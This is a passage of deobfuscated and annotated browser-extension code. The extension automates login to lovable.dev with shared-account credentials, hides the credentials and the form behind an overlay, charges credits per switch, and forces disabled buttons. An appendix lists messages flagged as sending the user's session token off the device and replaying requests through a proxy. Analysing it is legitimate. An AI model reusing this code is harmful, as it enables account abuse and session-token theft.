        type: "127HUB_MAIN_FILL_INPUT",
        selector: selector,
        value: value
      };
      window.postMessage(mainWorldFill, "*");
    } catch (e) {}

    var htmlInputValueDescriptor = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value");
    var ownPrototypeValueDescriptor = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(input) || {}, "value");
    var ownValueDescriptor = Object.getOwnPropertyDescriptor(input, "value");
    var nativeValueSetter = (htmlInputValueDescriptor && htmlInputValueDescriptor.set) || (ownPrototypeValueDescriptor && ownPrototypeValueDescriptor.set) || (ownValueDescriptor && ownValueDescriptor.set);
    if (nativeValueSetter) {
      nativeValueSetter.call(input, value);
    } else {
      input.value = value;
    }

    try {
      input.dispatchEvent(new InputEvent("beforeinput", {
        bubbles: true,
        cancelable: true,
        inputType: "insertText",
        data: value
      }));
    } catch (e) {}
    try {
      input.dispatchEvent(new InputEvent("input", {
        bubbles: true,
        cancelable: true,
        inputType: "insertText",
        data: value
      }));
    } catch (e) {}

    input.dispatchEvent(new Event("input", {
      bubbles: true,
      cancelable: true,
      composed: true
    }));
    input.dispatchEvent(new Event("change", {
      bubbles: true,
      cancelable: true,
      composed: true
    }));
    try {
      input.dispatchEvent(new FocusEvent("blur", {
        bubbles: true
      }));
      input.dispatchEvent(new FocusEvent("focus", {
        bubbles: true
      }));
    } catch (e) {}
  }

  /* -- 9.3  Is this button an OAuth / SSO button? --------------------------
   * Used everywhere to avoid clicking "Continue with Google" etc. */
  function isOAuthProviderButton(button) {
    if (!button) {
      return false;
    }
    var testId = (button.getAttribute("data-testid") || "").toLowerCase();
    if (testId.includes("google") || testId.includes("github") || testId.includes("apple") || testId.includes("oauth")) {
      return true;
    }
    var label = (button.textContent || "").trim().toLowerCase();
    if (label.includes("google") || label.includes("github") || label.includes("apple") || label.includes("sso")) {
      return true;
    }
    var ariaLabel = (button.getAttribute("aria-label") || "").toLowerCase();
    if (ariaLabel.includes("google") || ariaLabel.includes("github") || ariaLabel.includes("apple")) {
      return true;
    }
    return false;
  }

  /* -- 9.4  Text-matching button lookup (first candidate wins) ------------- */
  function findButtonByText(candidateLabels) {
    var buttons = Array.from(document.querySelectorAll("button"));
    for (var i = 0; i < buttons.length; i++) {
      var button = buttons[i];
      if (isOAuthProviderButton(button)) {
        continue;
      }
      var label = (button.textContent || "").trim().toLowerCase();
      for (var j = 0; j < candidateLabels.length; j++) {
        var wanted = candidateLabels[j].toLowerCase();
        if (label === wanted || label.indexOf(wanted) !== -1) {
          return button;
        }
      }
    }
    return null;
  }

  /* -- 9.5  Find the "Continue with Email" submit button ------------------- */
  function findEmailContinueButton(anchorInput) {
    var submitButton = document.querySelector("button[data-testid=\"auth-submit-button\"]");
    if (submitButton && !isOAuthProviderButton(submitButton)) {
      return submitButton;
    }
    if (anchorInput) {
      var form = anchorInput.closest("form");
      if (form) {
        var formButtons = Array.from(form.querySelectorAll("button"));
        for (var i = 0; i < formButtons.length; i++) {
          var candidate = formButtons[i];
          if (!isOAuthProviderButton(candidate)) {
            if (candidate.type === "submit" || (candidate.textContent || "").toLowerCase().includes("continue")) {
              return candidate;
            }
          }
        }
      }
    }
    return findButtonByText(["continue with email", "continue", "next"]);
  }

  /* -- 9.6  Find the final "Log in" submit button ------------------------- */
  function findLoginSubmitButton(anchorInput) {
    var submitButton = document.querySelector("button[data-testid=\"auth-submit-button\"]");
    if (submitButton && !isOAuthProviderButton(submitButton)) {
      return submitButton;
    }
    if (anchorInput) {
      var form = anchorInput.closest("form");
      if (form) {
        var formButtons = Array.from(form.querySelectorAll("button"));
        for (var i = 0; i < formButtons.length; i++) {
          var candidate = formButtons[i];
          if (!isOAuthProviderButton(candidate)) {
            if (candidate.type === "submit" || (candidate.textContent || "").toLowerCase().includes("log in") || (candidate.textContent || "").toLowerCase().includes("sign in")) {
              return candidate;
            }
          }
        }
      }
    }
    return findButtonByText(["log in", "login", "sign in"]);
  }

  /* -- 9.7  Find the "Continue with password" link/button ------------------ */
  function findContinueWithPasswordButton() {
    var explicitButton = document.querySelector("button[data-testid=\"auth-continue-with-password-button\"]");
    if (explicitButton) {
      return explicitButton;
    }
    return findButtonByText(["continue with password", "use password", "sign in with password"]);
  }

  /* -- 9.8  Submit a form by pressing Enter (bubbles into React handlers) -- */
  function pressEnter(element) {
    if (!element) {
      return;
    }
    try {
      element.focus();
    } catch (e) {}

    ["keydown", "keypress", "keyup"].forEach(function (eventName) {
      try {
        var enterEvent = new KeyboardEvent(eventName, {
          bubbles: true,
          cancelable: true,
          key: "Enter",
          code: "Enter",
          keyCode: 13,
          which: 13,
          charCode: 13
        });
        element.dispatchEvent(enterEvent);
      } catch (e) {}
    });
  }

  /* -- 9.9  Status banner (top-centre pill) ------------------------------- */
  function showStatusBanner(text, isError, isLoading) {
    try {
      var banner = document.getElementById("127hub-autologin-banner");
      if (!banner) {
        banner = document.createElement("div");
        banner.id = "127hub-autologin-banner";
        // BUG (present in the shipped code): the box-shadow value is truncated
        // into "0 0 25px padding:10px 22px !important;border-radius:..." and
        // the whole declaration block is then duplicated after the colour
        // concatenation below. The first half of the style string is invalid
        // CSS, and the second half is applied twice.
        banner.style.cssText = "position:fixed !important;top:16px !important;left:50% !important;transform:translateX(-50%) !important;background:#0f172a !important;color:#f8fafc !important;border:1.5px solid " + (isError ? "#ef4444" : "#38bdf8") + " !important;box-shadow:0 12px 45px rgba(0,0,0,0.85),0 0 25px padding:10px 22px !important;border-radius:9999px !important;font-family:system-ui,-apple-system,sans-serif !important;font-size:13px !important;font-weight:600 !important;z-index:2147483647 !important;display:flex !important;align-items:center !important;gap:10px !important;pointer-events:auto !important;animation:qlBannerIn 0.25s ease-out !important;" + (isError ? "rgba(239,68,68,0.3)" : "rgba(56,189,248,0.25)") + " !important;box-shadow:0 12px 45px rgba(0,0,0,0.85),0 0 25px padding:10px 22px !important;border-radius:9999px !important;font-family:system-ui,-apple-system,sans-serif !important;font-size:13px !important;font-weight:600 !important;z-index:2147483647 !important;display:flex !important;align-items:center !important;gap:10px !important;pointer-events:auto !important;animation:qlBannerIn 0.25s ease-out !important;";
        (document.body || document.documentElement).appendChild(banner);
      } else {
        banner.style.borderColor = isError ? "#ef4444" : "#38bdf8";
      }

      // Leading icon: spinner while loading, warning on error, tick on success.
      var iconPrefix = isLoading
        ? "<span style=\"width:14px;height:14px;border:2px solid rgba(56,189,248,0.25);border-top-color:#38bdf8;border-radius:50%;display:inline-block;animation:qlSpin 0.7s linear infinite;flex-shrink:0;\"></span>"
        : isError
          ? "<span style=\"color:#ef4444;font-size:15px;flex-shrink:0;\">⚠️</span>"
          : "<span style=\"color:#10b981;font-size:15px;flex-shrink:0;\">✓</span>";

      // BUG (present in the shipped code): the @keyframes rules are appended to
      // the text content instead of living inside a <style> element, so
      // qlSpin / qlBannerIn are actually never defined as animations.
      banner.innerHTML = iconPrefix + "<span>" + text + "</span>@keyframes qlSpin { to { transform: rotate(360deg); } }@keyframes qlBannerIn { from { opacity: 0; transform: translate(-50%, -12px); } to { opacity: 1; transform: translate(-50%, 0); } }";
    } catch (e) {}
  }

  /* -- 9.10  Remove the banner after `delay` ms (default: immediately) ----- */
  function hideStatusBannerSoon(delay) {
    setTimeout(function () {
      var banner = document.getElementById("127hub-autologin-banner");
      if (banner) {
        banner.remove();
      }
    }, delay || 0);
  }

  /* -- 9.11  Full-screen "Switching Workspace Account" overlay -------------
   * Doubles as a *privacy shield*: it covers the login form while the
   * credentials are being typed. */
  function showSwitchOverlay() {
    try {
      var overlay = document.getElementById("127hub-privacy-shield");
      if (!overlay) {
        overlay = document.createElement("div");
        overlay.id = "127hub-privacy-shield";
        overlay.style.cssText = "position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;width:100vw !important;height:100vh !important;background:#090d16 !important;z-index:2147483646 !important;display:flex !important;flex-direction:column !important;align-items:center !important;justify-content:center !important;color:#f8fafc !important;font-family:system-ui,-apple-system,sans-serif !important;animation:qlShieldFadeIn 0.2s ease-out !important;";
        // BUG (present in the shipped code): the progress-bar <div> is opened
        // but never closed, and the <style> block with qlShieldFadeIn /
        // qlShieldProgress sits inside the flex row instead of the <head>.
        overlay.innerHTML = "<div style=\"background:radial-gradient(130% 70% at 50% 0%, rgba(168, 85, 247, 0.2), transparent 70%), #0f172a; border: 1.5px solid rgba(168, 85, 247, 0.4); border-radius: 24px; padding: 40px 48px; text-align: center; box-shadow: 0 25px 70px rgba(0,0,0,0.95), 0 0 40px rgba(168, 85, 247, 0.3); max-width: 440px; width: 90%;\"><div style=\"width: 78px; height: 78px; margin: 0 auto 20px; border-radius: 50%; overflow: hidden; border: 2px solid rgba(0, 242, 254, 0.65); box-shadow: 0 0 30px rgba(168, 85, 247, 0.55); position: relative; background: #000;\"><video src=\"" + chrome.runtime.getURL("loop.mp4") + "\" autoplay loop muted playsinline style=\"width: 100%; height: 100%; object-fit: cover; display: block;\"></video></div><h2 style=\"font-size: 19px; font-weight: 800; color: #f8fafc; margin: 0 0 8px; letter-spacing: -0.02em;\">Switching Workspace Account</h2><p style=\"font-size: 13px; color: #94a3b8; margin: 0 0 24px; line-height: 1.5;\">Authenticating secure session and connecting to your project workspace...</p><div style=\"width: 100%; height: 6px; background: rgba(255, 255, 255, 0.08); border-radius: 9999px; overflow: hidden; position: relative; margin-bottom: 14px;\"><div style=\"width: 45%; height: 100%; background: linear-gradient(90deg, #38bdf8, #a855f7); border-radius: 9999px; animation: qlShieldProgress 1.4s ease-in-out infinite;\"></div><div style=\"font-size: 11.5px; color: #64748b; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 6px;\"><span style=\"width: 7px; height: 7px; border-radius: 50%; background: #10b981; box-shadow: 0 0 8px #10b981;\"></span>Automated Session Handshake<style>@keyframes qlShieldFadeIn { from { opacity: 0; } to { opacity: 1; } }@keyframes qlShieldProgress { 0% { transform: translateX(-100%); } 100% { transform: translateX(300%); } }</style>";
        (document.body || document.documentElement).appendChild(overlay);
      }
    } catch (e) {}
  }

  /* -- 9.12  Fade the overlay out and remove it --------------------------- */
  function hideSwitchOverlay() {
    try {
      var overlay = document.getElementById("127hub-privacy-shield");
      if (overlay) {
        overlay.style.transition = "opacity 0.25s ease-out";
        overlay.style.opacity = "0";
        setTimeout(function () {
          overlay.remove();
        }, 250);
      }
    } catch (e) {}
  }

  /* -- 9.13  Hide the credentials from the person using the browser --------
   * Blurs and text-security-masks exactly the email and password fields, so a
   * bystander cannot read the shared account's password while it is typed. */
  function maskCredentialInputs() {
    try {
      var styleEl = document.getElementById("127hub-mask-inputs-style");
      if (!styleEl) {
        styleEl = document.createElement("style");
        styleEl.id = "127hub-mask-inputs-style";
        styleEl.textContent = "input#email, input[type=\"email\"], input[name=\"email\"], input#password, input[type=\"password\"], input[name=\"password\"] { -webkit-text-security: disc !important; filter: blur(6px) !important; color: transparent !important; }";
        (document.head || document.documentElement).appendChild(styleEl);
      }
    } catch (e) {}
  }

  function unmaskCredentialInputs() {
    try {
      var styleEl = document.getElementById("127hub-mask-inputs-style");
      if (styleEl) {
        styleEl.remove();
      }
    } catch (e) {}
  }

  /* -- 9.14  Inject the "⚡ 1-Click 127HUB Auto Login" button ---------------
   * Only added on /login pages that actually show a form. Clicking it re-queues
   * the pending auto-login from chrome.storage (or the built-in defaults) and
   * starts the session immediately. */
  var loginSessionActive = false; // (declared below in the original; hoisted)
  var loginSessionStartedAt = 0;

  function injectOneClickLoginButton(email, password) {
    var pathname = window.location.pathname || "";
    if (!pathname.startsWith("/login") && !pathname.startsWith("/_auth/login")) {
      return;
    }
    if (document.getElementById("ql-1click-autologin-btn")) {
      return; // already injected
    }

    // Find the form, falling back to the closest container of the inputs.
    var loginForm = document.querySelector("form") || document.querySelector("[data-slot=\"form\"]");
    if (!loginForm) {
      var emailInput = document.querySelector("input#email, input[type=\"email\"], input[name=\"email\"]");
      var passwordInput = document.querySelector("input#password, input[type=\"password\"], input[name=\"password\"]");
      var anyInput = passwordInput || emailInput;
      if (anyInput) {
        loginForm = anyInput.closest("form") || anyInput.parentElement;
      }
    }
    if (!loginForm) {
      return;
    }

    var button = document.createElement("button");
    button.id = "ql-1click-autologin-btn";
    button.type = "button";
    button.innerHTML = "⚡ 1-Click 127HUB Auto Login";
    button.style.cssText = "width:100%;margin-top:14px;padding:11px 16px;background:linear-gradient(135deg,#0284c7 0%,#0369a1 100%);color:#ffffff;border:1.5px solid rgba(56,189,248,0.5);border-radius:9999px;font-size:13.5px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 15px rgba(2,132,199,0.35);font-family:system-ui,-apple-system,sans-serif;transition:all 0.2s ease;";

    button.addEventListener("mouseover", function () {
      button.style.boxShadow = "0 6px 20px rgba(56,189,248,0.55)";
      button.style.transform = "translateY(-1px)";
    });
    button.addEventListener("mouseout", function () {
      button.style.boxShadow = "0 4px 15px rgba(2,132,199,0.35)";
      button.style.transform = "translateY(0)";
    });

    button.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      showStatusBanner("127HUB AI: Starting 1-Click Auto Login...", false, true);

      chrome.storage.local.get(["ql_pending_autologin", "ql_pending_invite_url"], function (stored) {
        var pending = stored && stored.ql_pending_autologin;
        // Target project/invite URL: stored value, else page localStorage.
        var inviteUrl = (stored && stored.ql_pending_invite_url) || (pending && pending.inviteUrl) || "";
        if (!inviteUrl) {
          try {
            inviteUrl = window.localStorage.getItem("__127hub_pending_invite") || "";
          } catch (e) {}
        }

        chrome.storage.local.set({
          ql_pending_autologin: {
            email: email || (pending && pending.email) || SHARED_ACCOUNT_EMAIL,
            password: password || (pending && pending.password) || SHARED_ACCOUNT_PASSWORD,
            inviteUrl: inviteUrl,
            timestamp: Date.now(),
            status: "pending",
            submitted: false,
            cost: (pending && pending.cost) || 10,
            pendingDeduction: pending ? pending.pendingDeduction : false
          },
          ql_pending_invite_url: inviteUrl
        }, function () {
          loginSessionActive = false; // force a fresh session
          attemptAutoLogin();
        });
      });
    });

    // Place it under the real submit button when possible.
    var submitButton = document.querySelector("button[data-testid=\"auth-submit-button\"]") || findEmailContinueButton(null);
    if (submitButton && submitButton.parentElement) {
      submitButton.parentElement.parentElement.appendChild(button);
    } else {
      loginForm.appendChild(button);
    }
  }

  /* -- 9.15  Auto-login state ---------------------------------------------- */
  var loginSessionRunning = false; // a session loop is currently polling
  var lastSessionStartAt = 0;

  /* -- 9.16  Decide whether we should be logging in right now --------------
   * Reads the pending-login record and either navigates to /login, starts the
   * session, or finalises a completed switch (charge credits, redirect). */
  function attemptAutoLogin() {
    if (typeof chrome === "undefined" || !chrome.storage || !chrome.storage.local) {
      return;
    }
    var pathname = window.location.pathname || "";
    var onLoginPage = pathname.startsWith("/login") || pathname.startsWith("/_auth/login");

    chrome.storage.local.get(["ql_pending_autologin", "ql_pending_invite_url"], function (stored) {
      var pending = stored && stored.ql_pending_autologin;
      var inviteUrl = (stored && stored.ql_pending_invite_url) || (pending && pending.inviteUrl) || "";
      if (!inviteUrl) {
        try {
          inviteUrl = window.localStorage.getItem("__127hub_pending_invite") || "";
        } catch (e) {}
      }

      // Always (re)render the 1-click button on login pages.
      if (onLoginPage) {
        injectOneClickLoginButton((pending && pending.email) || SHARED_ACCOUNT_EMAIL, (pending && pending.password) || SHARED_ACCOUNT_PASSWORD);
      }

      if (!pending || !pending.email) {
        return;
      }

      // Pending logins expire after 5 minutes.
      var now = Date.now();
      if (now - (pending.timestamp || 0) > 300000) {
        log("Pending auto-login expired (>5m). Clearing.");
        chrome.storage.local.remove(["ql_pending_autologin", "ql_pending_invite_url"]);
        return;
      }

      if (!onLoginPage) {
        /* (a) We are somewhere else but a login is still pending -> go to the
         *     login page. */
        if (pending.status === "pending" || !pending.submitted) {
          log("Pending login requested but tab is on non-login page (" + pathname + "). Navigating to /login...");
          try {
            window.location.replace("https://lovable.dev/login");
          } catch (e) {
            window.location.href = "https://lovable.dev/login";
          }
          return;
        }

        /* (b) We already submitted and are now off the login page -> the login
         *     worked. Confirm the switch (this is where the 10 credits are
         *     actually charged) and forward the user to their project. */
        if (pending.submitted || pending.status === "done" || pending.status === "submitted") {
          log("Authenticated page (" + pathname + ") reached after login submission. Finalizing account switch...");

          if (pending.pendingDeduction) {
            pending.pendingDeduction = false;
            try {
              chrome.runtime.sendMessage({
                action: "confirmAccountSwitchSuccess",
                cost: pending.cost || 10
              }, function () {
                chrome.runtime.lastError;
              });
            } catch (e) {}
          }

          var targetUrl = (pending && pending.inviteUrl) || inviteUrl || "";
          if (!targetUrl) {
            try {
              targetUrl = window.localStorage.getItem("__127hub_pending_invite") || "";
            } catch (e) {}
          }

          // Only follow http(s) targets that are not another login page.
          var usableTarget = false;
          if (targetUrl && typeof targetUrl === "string" && targetUrl.startsWith("http")) {
            try {
              var parsed = new URL(targetUrl);
              if (!parsed.pathname.startsWith("/login") && !parsed.pathname.startsWith("/_auth/login")) {
                usableTarget = true;
              }
            } catch (e) {}
          }

          chrome.storage.local.remove(["ql_pending_autologin", "ql_pending_invite_url"]);
          try {
            window.localStorage.removeItem("__127hub_pending_invite");
          } catch (e) {}

          if (usableTarget && window.location.href !== targetUrl) {
            log("Redirecting authenticated user to target invite link:", targetUrl);
            showStatusBanner("✓ Auto-Login Successful! Redirecting to Project...", false, true);
            setTimeout(function () {
              window.location.replace(targetUrl);
            }, 600);
            return;
          } else {
            log("Already at target or no invite link provided. Switch complete.");
            showStatusBanner("✓ Account switched & logged in successfully!", false, false);
            hideStatusBannerSoon(5000);
            return;
          }
        }
        return;
      }

      // On the login page: start a session, but never stack loops and re-arm
      // after 25 s in case the previous one died.
      if (onLoginPage && (!loginSessionRunning || now - lastSessionStartAt > 25000)) {
        runLoginSession(pending);
      }
    });
  }

  /* -- 9.17  The login state machine ---------------------------------------
   * Polls the DOM every 350 ms for up to 120 ticks (~42 s) and drives the form
   * step by step. */
  function runLoginSession(pending) {
    loginSessionRunning = true;
    lastSessionStartAt = Date.now();
    log("Executing automated login session...");

    maskCredentialInputs();
    showSwitchOverlay();
    showStatusBanner("127HUB AI: Switching workspace account...", false, true);

    var ticks = 0;
    var maxTicks = 120; // 120 * 350 ms ≈ 42 s
    var emailSubmitSent = false;
    var passwordSubmitAttempts = 0;
    var lastEmailActionAt = 0;
    var lastPasswordActionAt = 0;
    var finished = false;

    /* 9.17a  Success path: called once the password was submitted and the app
     *        navigated away from /login. */
    function finishSuccess() {
      if (finished) {
        return;
      }
      if (passwordSubmitAttempts === 0) {
        // Guard: never claim success if the password was never submitted.
        log("finishSuccess blocked: Password has not been submitted yet!");
        return;
      }
      finished = true;
      clearInterval(pollTimer);
      loginSessionRunning = false;
      hideSwitchOverlay();
      unmaskCredentialInputs();

      pending.status = "done";
      pending.submitted = true;

      if (pending.pendingDeduction) {
        pending.pendingDeduction = false;
        try {
          chrome.runtime.sendMessage({
            action: "confirmAccountSwitchSuccess",
            cost: pending.cost || 10
          }, function () {
            chrome.runtime.lastError;
          });
        } catch (e) {}
      }

      chrome.storage.local.set({
        ql_pending_autologin: pending
      });

      var targetUrl = (pending && pending.inviteUrl) || "";
      if (!targetUrl) {
        try {
          targetUrl = window.localStorage.getItem("__127hub_pending_invite") || "";
        } catch (e) {}
      }

      var usableTarget = false;
      if (targetUrl && typeof targetUrl === "string" && targetUrl.startsWith("http")) {
        try {
          var parsed = new URL(targetUrl);
          if (!parsed.pathname.startsWith("/login") && !parsed.pathname.startsWith("/_auth/login")) {
            usableTarget = true;
          }
        } catch (e) {}
      }

      // Clean the pending record shortly after navigation starts.
      setTimeout(function () {
        chrome.storage.local.remove(["ql_pending_autologin", "ql_pending_invite_url"]);
        try {
          window.localStorage.removeItem("__127hub_pending_invite");
        } catch (e) {}
      }, 4000);

      if (usableTarget) {
        showStatusBanner("✓ Switch Successful! Redirecting to Project...", false, false);
        setTimeout(function () {
          window.location.replace(targetUrl);
        }, 800);
      } else {
        showStatusBanner("✓ Login Successful! Loading dashboard...", false, false);
        setTimeout(function () {
          window.location.replace("https://lovable.dev/dashboard");
        }, 800);
      }
    }

    /* 9.17b  The polling loop */
    var pollTimer = setInterval(function () {
      ticks++;
      if (finished) {
        clearInterval(pollTimer);
        return;
      }

      // Global timeout.
      if (ticks > maxTicks) {
        clearInterval(pollTimer);
        loginSessionRunning = false;
        hideSwitchOverlay();
        unmaskCredentialInputs();
        showStatusBanner("Auto-login timeout. Click 1-Click button or submit manually.", true, false);
        hideStatusBannerSoon(7000);
        return;
      }

      // Navigated off /login after submitting the password -> success.
      var pathname = window.location.pathname || "";
      if (!pathname.startsWith("/login") && !pathname.startsWith("/_auth/login")) {
        if (passwordSubmitAttempts > 0) {
          finishSuccess();
          return;
        }
      }

      // Step 0: if the page offers "switch to login", click it.
      var switchToLoginLink = document.querySelector("button[data-testid=\"auth-switch-to-login-link\"], a[data-testid=\"auth-switch-to-login-link\"]");
      if (switchToLoginLink) {
        try {
          switchToLoginLink.click();
        } catch (e) {}
      }

      // Step 1: reveal the password field if needed.
      var continueWithPassword = findContinueWithPasswordButton();
      if (continueWithPassword) {
        var passwordFieldProbe = document.querySelector("input#password, input[type=\"password\"], input[name=\"password\"]");
        if (!passwordFieldProbe) {
          log("Found 'Continue with password' button. Clicking it to reveal password field...");
          try {
            continueWithPassword.click();
          } catch (e) {}
          return;
        }
      }

      var emailInput = document.querySelector("input#email, input[type=\"email\"], input[name=\"email\"], input[placeholder*=\"Email\" i]");
      var passwordInput = document.querySelector("input#password, input[type=\"password\"], input[name=\"password\"]");
      var now = Date.now();

      /* ---- Step 2: password screen ------------------------------------- */
      if (passwordInput) {
        // 2a. Fill the password if it is not there yet.
        if (passwordInput.value !== pending.password) {
          log("Step 2: Password field found. Submitting credentials...");
          showStatusBanner("127HUB AI: Authenticating...", false, true);
          setInputValue(passwordInput, pending.password);
          lastPasswordActionAt = now;
          return;
        }

        // 2b. Password is in place: submit it (with retries).
        if (passwordInput.value === pending.password && now - lastPasswordActionAt >= 350) {
          var submitButton = findLoginSubmitButton(passwordInput);
          var submitBusy = submitButton && (submitButton.disabled || submitButton.getAttribute("aria-disabled") === "true" || submitButton.classList.contains("loading") || submitButton.querySelector("[data-slot=\"loading-spinner\"]") !== null);

          if (submitBusy && passwordSubmitAttempts === 0 && now - lastPasswordActionAt < 3000) {
            log("Step 2: Submit button currently disabled/loading, waiting for it to be ready...");
            return;
          }

          if (passwordSubmitAttempts === 0 || (now - lastPasswordActionAt > 3500 && passwordSubmitAttempts < 4)) {
            passwordSubmitAttempts++;
            lastPasswordActionAt = now;
            log("Step 2: Submitting login credentials (attempt " + passwordSubmitAttempts + ")...");
            showStatusBanner("127HUB AI: Connecting to workspace...", false, true);

            pending.submitted = true;
            pending.status = "submitted";
            chrome.storage.local.set({
              ql_pending_autologin: pending
            });

            pressEnter(passwordInput);
            var form = passwordInput.closest("form");
            if (form && typeof form.requestSubmit === "function") {
              try {
                form.requestSubmit();
              } catch (e) {}
            }
            if (submitButton && !isOAuthProviderButton(submitButton)) {
              try {
                submitButton.disabled = false; // defeat a disabled state
              } catch (e) {}
              try {
                submitButton.click();
              } catch (e) {}
            }
          }
        }
        return;
      }

      /* ---- Step 1: e-mail screen --------------------------------------- */
      if (emailInput && !passwordInput) {
        // 1a. Fill the email.
        if (emailInput.value !== pending.email) {
          log("Step 1: Entering account email...");
          setInputValue(emailInput, pending.email);
          lastEmailActionAt = now;
          return;
        }

        // 1b. Submit the email (Enter + continue button), then retry once.
        if (emailInput.value === pending.email && now - lastEmailActionAt >= 300) {
          var continueButton = findEmailContinueButton(emailInput);
          var continueBusy = continueButton && (continueButton.disabled || continueButton.getAttribute("aria-disabled") === "true" || continueButton.querySelector("[data-slot=\"loading-spinner\"]") !== null);

          if (!emailSubmitSent || (now - lastEmailActionAt > 6000 && emailSubmitSent && !continueBusy)) {
            emailSubmitSent = true;
            lastEmailActionAt = now;
            log("Step 1: Submitting email via Enter key & Continue button...");
            showStatusBanner("127HUB AI: Authenticating...", false, true);

            pressEnter(emailInput);
            var emailForm = emailInput.closest("form");
            if (emailForm && typeof emailForm.requestSubmit === "function") {
              try {
                emailForm.requestSubmit();
              } catch (e) {}
            }
            if (continueButton && !isOAuthProviderButton(continueButton)) {
              try {
                continueButton.disabled = false;
              } catch (e) {}
              try {
                continueButton.click();
              } catch (e) {}
            }
          }
        }
        return;
      }

      /* ---- Error reporting --------------------------------------------- */
      var errorNode = document.querySelector("[role=\"alert\"], .text-destructive, .text-red-500");
      if (errorNode && errorNode.textContent && errorNode.textContent.trim().length > 6) {
        var errorText = errorNode.textContent.trim();
        log("Lovable form error detected:", errorText);
        hideSwitchOverlay();
        unmaskCredentialInputs();
        showStatusBanner("⚠️ " + errorText.slice(0, 75), true, false);
      }
    }, 350);
  }

  /* -- 9.18  Triggers ------------------------------------------------------
   * A pending login is picked up when it is written to storage, on every tick
   * while on a /login page, and once at startup. */
  if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged) {
    chrome.storage.onChanged.addListener(function (changes, areaName) {
      if (areaName === "local" && changes.ql_pending_autologin && changes.ql_pending_autologin.newValue) {
        log("Detected ql_pending_autologin update via storage listener!");
        attemptAutoLogin();
      }
    });
  }

  setInterval(function () {
    var pathname = window.location.pathname || "";
    if (pathname.startsWith("/login") || pathname.startsWith("/_auth/login")) {
      attemptAutoLogin();
    }
  }, 1000);

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", attemptAutoLogin);
  } else {
    attemptAutoLogin();
  }
})();

/* =============================================================================
 * APPENDIX — surface used by this file (for cross-referencing with the other
 * deobfuscated bundle files)
 * -----------------------------------------------------------------------------
 *  window.postMessage types EMITTED by content.js
 *    LOVASIRI_EXTENSION_BRIDGE        {source, id, ok, result, error}
 *    {source:"LOVASIRI_EXTENSION_BRIDGE", event:"storage.changed"|"icon_clicked"}
 *    lovasiriNativeIntercept          {enabled, method}
 *    lovasiriRequestToken -> (see note)  {type:"lovableRequestToken"}
 *    lovasiriTriggerForceHeartbeat_response {msgId, ok}
 *    lovasiriProxySendResult          {requestId, result}
 *    APP_SYNC_CREDITS / APP_SYNC_SWITCH_LIMIT
 *    APP_SWITCH_RESULT / APP_DEDUCT_CREDITS_RESULT / APP_GET_CREDITS_RESULT
 *    127HUB_MAIN_FILL_INPUT           {selector, value}
 *
 *  window.postMessage types CONSUMED by content.js
 *    {source:"LOVASIRI_PAGE_PAYLOAD", id, type: storage.get|storage.set|
 *        storage.remove|runtime.sendMessage}
 *    lovableTokenFound                {token, projectId}      ★ exfiltration
 *    lovasiri_check_license_now
 *    lovasiriTriggerForceHeartbeat    {msgId}
 *    lovasiriProxySend                {message, token, projectId, castleToken,
 *                                      sessionId, clientGitSha, files,
 *                                      optimisticImageUrls}    ★ proxying
 *    APP_TRIGGER_SWITCH               {licenseKey, inviteUrl}
 *    APP_DEDUCT_CREDITS               {amount}
 *    APP_GET_CREDITS
 *
 *  chrome.runtime messages SENT by content.js
 *    lovableSync {token, projectId}                 ★ user token leaves device
 *    backendProxySend {...}                         ★ request replay proxy
 *    switchAccount {licenseKey, inviteUrl}
 *    deductCredits {amount} | getCredits
 *    confirmAccountSwitchSuccess {cost}
 *    heartbeat | forceHeartbeat
 *
 *  chrome.runtime messages RECEIVED by content.js
 *    credits_updated | lovasiri_auto_logout | lovasiri_icon_clicked |
 *    lovasiri_show_server_down
 *
 *  chrome.storage.local keys
 *    ql_send_method, ql_credits, ql_max_credits, ql_license_valid,
 *    ql_license_key, ql_license_status, ql_daily_switch_limit,
 *    ql_switches_today, ql_switches_left_today, ql_pending_autologin,
 *    ql_pending_invite_url, ql_user_name, ql_activated_at, ql_expires_at,
 *    ql_plan
 *
 *  Page localStorage keys
 *    __127hub_pending_invite
 *
 *  DOM ids owned by this file
 *    lovasiri-server-down-popup, 127hub-autologin-banner,
 *    127hub-privacy-shield, 127hub-mask-inputs-style, ql-1click-autologin-btn
 * =========================================================================== */
